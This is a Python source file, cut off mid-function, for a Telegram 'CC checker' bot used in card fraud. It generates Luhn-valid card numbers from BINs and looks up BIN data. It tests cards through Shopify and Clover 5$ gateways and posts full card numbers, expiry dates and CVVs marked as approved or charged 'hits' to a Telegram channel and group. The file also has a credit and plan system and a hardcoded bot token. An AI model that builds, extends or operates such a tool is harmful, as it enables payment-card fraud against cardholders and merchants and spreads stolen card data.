import asyncio
import json
import os
import random
import time
import uuid
import re
import requests
import logging
import traceback
from datetime import datetime
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CommandHandler, CallbackQueryHandler, ContextTypes
from telegram.constants import ParseMode
from fake_useragent import UserAgent
import httpx
from urllib.parse import urlparse
import aiohttp
from typing import Dict, Any, Optional

logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s - %(name)s - %(levelname)s - %(message)s"
)
logger = logging.getLogger(__name__)

BOT_TOKEN = "8885679687:AAFdfxrjNcn4pWi50LQpGrfjfCIYJDQh0oY"
OWNER_ID = 8719835658
DATA_FILE = "data.json"
USERS_FILE = "users.json"
SITES_FILE = "sites.txt"
VIDEO_URL = "https://t.me/xxxx"
CHANNEL_ID = -1004428457353
REQUIRED_CHANNEL_ID = -1004428457353
REQUIRED_CHANNEL_LINK = "https://t.me/shomifyhittrt"
HIT_GROUP_ID = -1004428457353

active_checks = {}
mass_check_running = {}
BOT_MAINTENANCE = False

EMOJI = {
    "infinity": "5989996695079882285",
    "shopify": "5992246772611681940",
    "stripe": "5992246772611681940",
    "tools": "5989975649740134220",
    "crown": "5992102835372691472",
    "premium": "5992384035471495905",
    "free": "5989952018830069575",
    "vip": "5992384035471495905",
    "success": "5260726538302660868",
    "approved": "5260726538302660868",
    "live": "5260726538302660868",
    "passed": "5260726538302660868",
    "unban": "5260726538302660868",
    "error": "5260342697075416641",
    "declined": "5260342697075416641",
    "dead": "5260342697075416641",
    "failed": "5260342697075416641",
    "ban": "5260726538302660868",
    "delete": "5992276017044001388",
    "remove": "5992276017044001388",
    "warning": "5990160522312421883",
    "otp": "5330066942755615469",
    "card": "5992246772611681940",
    "brand_icon": "5258477770735885832",
    "bin_icon": "5258477770735885832",
    "gen": "5989975649740134220",
    "gateway": "5990332467033150285",
    "price": "5992246772611681940",
    "credit": "5359719332542718652",
    "count_icon": "5989975649740134220",
    "bank": "5258260149037965799",
    "vbv": "5992246772611681940",
    "proxy": "5258430848218176413",
    "user": "5990171882500920057",
    "me": "5990171882500920057",
    "plan": "5990171882500920057",
    "id": "5990171882500920057",
    "show": "5990039485839052843",
    "info": "5258330865674494479",
    "address": "5990039485839052843",
    "country": "5258509201306557640",
    "check": "5990158512267726679",
    "loading": "5427181942934088912",
    "check_yes": "5990173055026990900",
    "check_no": "5992162638497321235",
    "stop": "5992276017044001388",
    "plus": "5990267033206395108",
    "back": "5990170559650991836",
    "admin": "6102866966739946205",
    "owner": "5874994448898725106",
    "lock": "5990055153879748658",
    "site": "5990039485839052843",
    "mass": "5989975649740134220",
    "cmd": "5989975649740134220",
    "code": "5989975649740134220",
    "redeem": "5989975649740134220",
    "key": "5989975649740134220",
    "buy": "5992246772611681940",
    "dm": "5260268501515377807",
    "dev": "5990246683651345859",
    "time": "5992184495585889960",
    "total": "5992246772611681940",
    "insufficient": "5258152182150077732",
    "unsupported": "5992162638497321235",
    "limit": "5992162638497321235",
    "speed": "5992200640367956465",
    "turn_off": "5992146008383950436",
    "checker_menu": "5989975649740134220",
    "my_account": "5990171882500920057",
    "admin_panel": "5992129361090711368",
    "upgrade": "5258204546391351475",
    "channel": "5992600330024521485",
    "support": "5992200618893119382",
    "kashier": "5992246772611681940",
}

def get_emoji_text(name):
    eid = EMOJI.get(name, "")
    if eid:
        return f'<tg-emoji emoji-id="{eid}">⚡</tg-emoji>'
    return "•"

def to_bold(text):
    bold_map = {
        'A': '𝗔', 'B': '𝗕', 'C': '𝗖', 'D': '𝗗', 'E': '𝗘', 'F': '𝗙', 'G': '𝗚', 'H': '𝗛', 'I': '𝗜',
        'J': '𝗝', 'K': '𝗞', 'L': '𝗟', 'M': '𝗠', 'N': '𝗡', 'O': '𝗢', 'P': '𝗣', 'Q': '𝗤', 'R': '𝗥',
        'S': '𝗦', 'T': '𝗧', 'U': '𝗨', 'V': '𝗩', 'W': '𝗪', 'X': '𝗫', 'Y': '𝗬', 'Z': '𝗭',
        'a': '𝗮', 'b': '𝗯', 'c': '𝗰', 'd': '𝗱', 'e': '𝗲', 'f': '𝗳', 'g': '𝗴', 'h': '𝗵', 'i': '𝗶',
        'j': '𝗷', 'k': '𝗸', 'l': '𝗹', 'm': '𝗺', 'n': '𝗻', 'o': '𝗼', 'p': '𝗽', 'q': '𝗾', 'r': '𝗿',
        's': '𝘀', 't': '𝘁', 'u': '𝘂', 'v': '𝘃', 'w': '𝘄', 'x': '𝘅', 'y': '𝘆', 'z': '𝘇',
        '0': '𝟬', '1': '𝟭', '2': '𝟮', '3': '𝟯', '4': '𝟰', '5': '𝟱', '6': '𝟲', '7': '𝟳', '8': '𝟴', '9': '𝟵',
        ' ': ' ', '.': '.', ',': ',', '!': '!', '?': '?', '@': '@', '#': '#', '$': '$', '%': '%',
        '^': '^', '&': '&', '*': '*', '(': '(', ')': ')', '-': '-', '_': '_', '=': '=', '+': '+',
        '{': '{', '}': '}', '[': '[', ']': ']', '|': '|', '\\': '\\', ':': ':', ';': ';', '"': '"',
        "'": "'", '<': '<', '>': '>', '/': '/', '`': '`', '~': '~', '\n': '\n', '\t': '\t'
    }
    return ''.join(bold_map.get(char, char) for char in text)

def format_card_text(card_number, month, year, cvv):
    return f"{card_number}|{month}|{year}|{cvv}"

async def send_hit_to_group_async(cc, mon, year, cvv, gateway, result, username, plan, time_taken):
    try:
        card_formatted = format_card_text(cc, mon, year, cvv)
        
        result_upper = result.upper()
        if "ORDER_PLACED" in result_upper or "APPROVED" in result_upper:
            status_icon = get_emoji_text('approved')
            status_display = "ORDER_PLACED"
        elif "CHARGED 5$" in result_upper or "CHARGED" in result_upper:
            status_icon = get_emoji_text('warning')
            status_display = "Charged 5$"
        elif "PAID" in result_upper or "PAID ✅" in result_upper:
            status_icon = get_emoji_text('approved')
            status_display = "Paid ✅"
        elif "INSUFFICIENT" in result_upper or "INSUFFICIENT FUNDS" in result_upper:
            status_icon = get_emoji_text('insufficient')
            status_display = "Insufficient funds"
        elif "OTP" in result_upper or "OTP_REQUIRED" in result_upper:
            status_icon = get_emoji_text('otp')
            status_display = "OTP REQUIRED"
        else:
            status_icon = get_emoji_text('success')
            status_display = result
        
        text = f"""{get_emoji_text('success')} New Hit Detected 
____________________
{get_emoji_text('gateway')} Gateway: {gateway}
{get_emoji_text('info')} Result: {status_icon} {status_display}
{get_emoji_text('user')} User: @{username}
____________________
{get_emoji_text('dev')} Bot By: @hhhiqh - @v_dark"""
        
        async with aiohttp.ClientSession() as session:
            await session.post(
                f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage",
                json={"chat_id": HIT_GROUP_ID, "text": text, "parse_mode": "HTML"}
            )
    except Exception as ex:
        logger.error(f"Error sending hit to group: {ex}")

def luhn_checksum(card_number):
    def digits_of(n): return [int(d) for d in str(n)]
    digits = digits_of(card_number)
    odd_digits = digits[-1::-2]
    even_digits = digits[-2::-2]
    checksum = sum(odd_digits)
    for d in even_digits:
        checksum += sum(digits_of(d * 2))
    return checksum % 10

def is_luhn_valid(card_number):
    return luhn_checksum(card_number) == 0

def calculate_luhn(partial_card):
    for i in range(10):
        full_card = partial_card + str(i)
        if is_luhn_valid(full_card):
            return str(i)
    return '0'

BIN_DB = {
    "4": {"brand": "VISA", "length": 16, "type": "Credit"},
    "51": {"brand": "MASTERCARD", "length": 16, "type": "Credit"},
    "52": {"brand": "MASTERCARD", "length": 16, "type": "Credit"},
    "53": {"brand": "MASTERCARD", "length": 16, "type": "Credit"},
    "54": {"brand": "MASTERCARD", "length": 16, "type": "Credit"},
    "55": {"brand": "MASTERCARD", "length": 16, "type": "Credit"},
    "2221": {"brand": "MASTERCARD", "length": 16, "type": "Credit"},
    "2720": {"brand": "MASTERCARD", "length": 16, "type": "Credit"},
    "34": {"brand": "AMEX", "length": 15, "type": "Credit"},
    "37": {"brand": "AMEX", "length": 15, "type": "Credit"},
    "6011": {"brand": "DISCOVER", "length": 16, "type": "Credit"},
    "65": {"brand": "DISCOVER", "length": 16, "type": "Credit"},
    "3528": {"brand": "JCB", "length": 16, "type": "Credit"},
    "3531": {"brand": "JCB", "length": 16, "type": "Credit"},
}

def get_brand_from_bin(bin_str):
    prefixes = sorted(BIN_DB.keys(), key=len, reverse=True)
    for prefix in prefixes:
        if bin_str.startswith(prefix):
            return BIN_DB[prefix]
    if bin_str.startswith('4'):
        return {"brand": "VISA", "length": 16, "type": "Credit"}
    if bin_str.startswith('5'):
        return {"brand": "MASTERCARD", "length": 16, "type": "Credit"}
    return {"brand": "UNKNOWN", "length": 16, "type": "Credit"}

def generate_cc(bin_str, exp_month=None, exp_year=None, cvv=None, quantity=10):
    cards = []
    bin_info = get_brand_from_bin(bin_str)
    card_length = bin_info['length']
    brand = bin_info['brand']
    for _ in range(quantity):
        remaining_length = card_length - len(bin_str) - 1
        if remaining_length < 0:
            card_length = len(bin_str) + 1
            remaining_length = 0
        middle_digits = ''.join([str(random.randint(0, 9)) for _ in range(remaining_length)])
        partial = bin_str + middle_digits
        check_digit = calculate_luhn(partial)
        card_number = partial + check_digit
        if exp_month:
            month = exp_month.zfill(2)
        else:
            month = str(random.randint(1, 12)).zfill(2)
        if exp_year:
            if len(str(exp_year)) == 2:
                year = str(exp_year)
            else:
                year = str(exp_year)[-2:]
        else:
            current_year = datetime.now().year % 100
            year = str(random.randint(current_year, current_year + 5))
        if cvv:
            final_cvv = str(cvv)
        else:
            if brand == "AMEX":
                final_cvv = ''.join([str(random.randint(0, 9)) for _ in range(4)])
            else:
                final_cvv = ''.join([str(random.randint(0, 9)) for _ in range(3)])
        cards.append({"number": card_number, "month": month, "year": year, "cvv": final_cvv, "brand": brand, "formatted": f"{card_number}|{month}|{year}|{final_cvv}"})
    return cards

def get_bin_info(bin_str):
    bin_str = str(bin_str)[:6]
    try:
        r = requests.get(f'https://bins.antipublic.cc/bins/{bin_str}', timeout=10)
        data = r.json()
        return {"bin": data.get("bin", bin_str), "brand": data.get("brand", ""), "type": data.get("type", ""), "level": data.get("level", ""), "bank": data.get("bank", ""), "country": data.get("country_name", ""), "flag": data.get("country_flag", "")}
    except:
        return {"bin": bin_str, "brand": "", "type": "", "level": "", "bank": "", "country": "", "flag": ""}

def is_shopify_gateway(gateway_name):
    if not gateway_name:
        return False
    gateway_lower = gateway_name.lower()
    shopify_keywords = ['shopify', 'shopify_payments', 'shopify_payments_v2', 'payments']
    for keyword in shopify_keywords:
        if keyword in gateway_lower:
            return True
    return False

async def send_approved_to_channel_shopify_async(cc, mon, year, cvv, price, status_msg, time_taken, username, plan, gateway="Shopify"):
    try:
        bin_info = get_bin_info(cc[:6])
        brand = bin_info.get('brand', 'Unknown')
        card_type = bin_info.get('type', 'Unknown')
        level = bin_info.get('level', '')
        bank = bin_info.get('bank', 'Unknown')
        country = bin_info.get('country', 'Unknown')
        flag = bin_info.get('flag', '')
        
        type_display = f"{card_type}"
        if level:
            type_display += f" - {level}"
        
        card_formatted = format_card_text(cc, mon, year, cvv)
        
        text = f"""{get_emoji_text('approved')} APPROVED

{get_emoji_text('card')} CC ⇾ <code>{card_formatted}</code>
{get_emoji_text('gateway')} Gateway ⇾ {gateway} ${price}
{get_emoji_text('info')} Response ⇾ {status_msg}

{get_emoji_text('brand_icon')} BIN Info ⇾ {brand} - {type_display}
{get_emoji_text('bank')} Bank ⇾ {bank.upper()}
{get_emoji_text('country')} Country ⇾ {country} {flag}

Checked ⇾ @{username} | {plan}
{get_emoji_text('time')} Time ⇾ {time_taken}"""
        
        async with aiohttp.ClientSession() as session:
            await session.post(
                f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage",
                json={"chat_id": CHANNEL_ID, "text": text, "parse_mode": "HTML"}
            )
        
        status_upper = status_msg.upper()
        if "ORDER_PLACED" in status_upper or "INSUFFICIENT" in status_upper or "OTP" in status_upper:
            await send_hit_to_group_async(cc, mon, year, cvv, gateway, status_msg, username, plan, time_taken)
            
    except Exception as ex:
        logger.error(f"Error sending to channel: {ex}")

async def send_homegrown_to_channel_async(cc, mon, year, cvv, status_msg, time_taken, username, plan, gateway="Clover 5$"):
    try:
        bin_info = get_bin_info(cc[:6])
        brand = bin_info.get('brand', 'Unknown')
        card_type = bin_info.get('type', 'Unknown')
        level = bin_info.get('level', '')
        bank = bin_info.get('bank', 'Unknown')
        country = bin_info.get('country', 'Unknown')
        flag = bin_info.get('flag', '')
        
        type_display = f"{card_type}"
        if level:
            type_display += f" - {level}"
        
        card_formatted = format_card_text(cc, mon, year, cvv)
        
        if "Paid ✅" in status_msg or "APPROVED" in status_msg.upper():
            status_icon = get_emoji_text('approved')
            status_display = "Paid ✅"
        elif "Charged" in status_msg or "5$" in status_msg:
            status_icon = get_emoji_text('warning')
            status_display = "Charged 5$"
        elif "insufficient" in status_msg.lower():
            status_icon = get_emoji_text('insufficient')
            status_display = "Insufficient funds"
        elif "CVV2 DECLINED" in status_msg.upper():
            status_icon = get_emoji_text('declined')
            status_display = "CVV2 DECLINED"
        elif "Invalid" in status_msg or "invalid" in status_msg.lower():
            status_icon = get_emoji_text('declined')
            status_display = "INVALID CARD"
        elif "declined" in status_msg.lower() or "Declined" in status_msg:
            status_icon = get_emoji_text('declined')
            status_display = "DECLINED"
        else:
            status_icon = get_emoji_text('declined')
            status_display = status_msg[:30] if status_msg else "DECLINED"
        
        text = f"""{status_icon} {status_display}

{get_emoji_text('card')} CC ⇾ <code>{card_formatted}</code>
{get_emoji_text('gateway')} Gateway ⇾ {gateway}
{get_emoji_text('info')} Response ⇾ {status_msg}

{get_emoji_text('brand_icon')} BIN Info ⇾ {brand} - {type_display}
{get_emoji_text('bank')} Bank ⇾ {bank.upper()}
{get_emoji_text('country')} Country ⇾ {country} {flag}

Checked ⇾ @{username} | {plan}
{get_emoji_text('time')} Time ⇾ {time_taken}"""
        
        async with aiohttp.ClientSession() as session:
            await session.post(
                f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage",
                json={"chat_id": CHANNEL_ID, "text": text, "parse_mode": "HTML"}
            )
        
        status_lower = status_msg.lower()
        if "charged" in status_lower or "5$" in status_lower or "insufficient" in status_lower or "paid" in status_lower:
            await send_hit_to_group_async(cc, mon, year, cvv, gateway, status_msg, username, plan, time_taken)
            
    except Exception as ex:
        logger.error(f"Error sending homegrown to channel: {ex}")

async def notify_admins_on_redeem_async(user_id, username, code, credits):
    data = load_data()
    for uid, user in data["users"].items():
        if user["plan"] in ["Owner", "Admin"] and not user.get("banned", False):
            try:
                text = f"""{get_emoji_text('redeem')} Code Redeemed!

{get_emoji_text('user')} User: @{username} (<code>{user_id}</code>)
{get_emoji_text('code')} Code: <code>{code}</code>
{get_emoji_text('credit')} Credits: +{credits}
{get_emoji_text('time')} Time: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}"""
                async with aiohttp.ClientSession() as session:
                    await session.post(
                        f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage",
                        json={"chat_id": int(uid), "text": text, "parse_mode": "HTML"}
                    )
            except:
                pass

def load_data():
    if not os.path.exists(DATA_FILE):
        default = {"users": {str(OWNER_ID): {"username": "Owner", "credits": 999999, "plan": "Owner", "proxy": None, "proxies": [], "banned": False, "joined": datetime.now().isoformat()}}, "codes": {}, "banned_users": []}
        save_data(default)
        return default
    with open(DATA_FILE, 'r', encoding='utf-8') as f:
        return json.load(f)

def save_data(data):
    with open(DATA_FILE, 'w', encoding='utf-8') as f:
        json.dump(data, f, indent=2, ensure_ascii=False)

def save_users_json():
    data = load_data()
    users_info = []
    for uid, user in data["users"].items():
        proxy_value = user.get("proxy", None)
        proxies_list = user.get("proxies", [])
        proxy_status = "Set" if (proxy_value and proxy_value != "Not Set") or proxies_list else "Not Set"
        users_info.append({"user_id": int(uid), "username": user.get("username", "N/A"), "name": user.get("name", "N/A"), "plan": user.get("plan", "Free"), "credits": user.get("credits", 0), "proxy": proxy_status, "proxy_count": len(proxies_list), "banned": user.get("banned", False), "joined": user.get("joined", "N/A")})
    with open(USERS_FILE, 'w', encoding='utf-8') as f:
        json.dump(users_info, f, indent=2, ensure_ascii=False)

def load_sites():
    if not os.path.exists(SITES_FILE):
        with open(SITES_FILE, 'w') as f:
            f.write("example.myshopify.com\n")
        return ["example.myshopify.com"]
    with open(SITES_FILE, 'r') as f:
        sites = [line.strip() for line in f if line.strip()]
        if not sites:
            sites = ["example.myshopify.com"]
        return sites

def get_user(user_id):
    data = load_data()
    return data["users"].get(str(user_id), None)

def create_user(user_id, username, first_name="N/A"):
    data = load_data()
    uid = str(user_id)
    if uid not in data["users"]:
        data["users"][uid] = {"username": username or "N/A", "name": first_name or "N/A", "credits": 250, "plan": "Premium", "proxy": None, "proxies": [], "banned": False, "joined": datetime.now().isoformat()}
        save_data(data)
        save_users_json()
        return True, 250
    return False, 0

def add_credits(user_id, amount):
    data = load_data()
    uid = str(user_id)
    if uid in data["users"]:
        user = data["users"][uid]
        if user["plan"] in ["Owner", "Admin"]:
            return True
        user["credits"] += amount
        if user["credits"] >= 1:
            user["plan"] = "Premium"
        save_data(data)
        save_users_json()
        return True
    return False

def deduct_credit(user_id):
    data = load_data()
    uid = str(user_id)
    if uid in data["users"]:
        user = data["users"][uid]
        if user["plan"] in ["Owner", "Admin"]:
            return True
        if user["credits"] > 0:
            user["credits"] -= 1
            if user["credits"] == 0:
                user["plan"] = "Free"
            save_data(data)
            save_users_json()
            retu